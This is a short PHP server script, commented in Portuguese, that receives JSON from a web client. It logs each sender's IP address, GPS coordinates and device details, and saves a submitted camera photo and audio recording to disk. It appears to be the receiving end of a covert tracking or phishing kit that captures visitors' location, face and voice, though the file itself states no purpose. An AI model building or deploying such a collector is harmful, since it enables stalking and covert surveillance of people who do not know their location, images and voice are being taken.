<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);
    
    if ($data) {
        $ip = $data['ip'] ?? 'Desconhecido';
        $latitude = $data['latitude'] ?? 'Desconhecido';
        $longitude = $data['longitude'] ?? 'Desconhecido';
        $deviceInfo = $data['deviceInfo'] ?? [];
        
        $userAgent = $deviceInfo['userAgent'] ?? 'Desconhecido';
        $platform = $deviceInfo['platform'] ?? 'Desconhecido';
        $language = $deviceInfo['language'] ?? 'Desconhecido';
        
        // Criar uma entrada de log
        $logEntry = "IP: $ip\nLatitude: $latitude\nLongitude: $longitude\nUser Agent: $userAgent\nPlataforma: $platform\nIdioma: $language\n";
        
        // Verificar e salvar a imagem
        if (!empty($data['image'])) {
            $imageData = str_replace(' ', '+', preg_replace('#^data:image/\w+;base64,#i', '', $data['image']));
            $imageName = 'photo_' . time() . '.png';
            file_put_contents($imageName, base64_decode($imageData));
            $logEntry .= "Imagem salva: $imageName\n";
        }
        
        // Verificar e salvar o áudio
        if (!empty($data['audio'])) {
            $audioData = str_replace(' ', '+', preg_replace('#^data:audio/\w+;base64,#i', '', $data['audio']));
            $audioName = 'audio_' . time() . '.wav';
            file_put_contents($audioName, base64_decode($audioData));
            $logEntry .= "Áudio salvo: $audioName\n";
        }
        
        $logEntry .= "--------------------\n";
        
        // Salvar o log
        file_put_contents('access_log.txt', $logEntry, FILE_APPEND);
        
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Dados inválidos.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Método não permitido.']);
}
?>
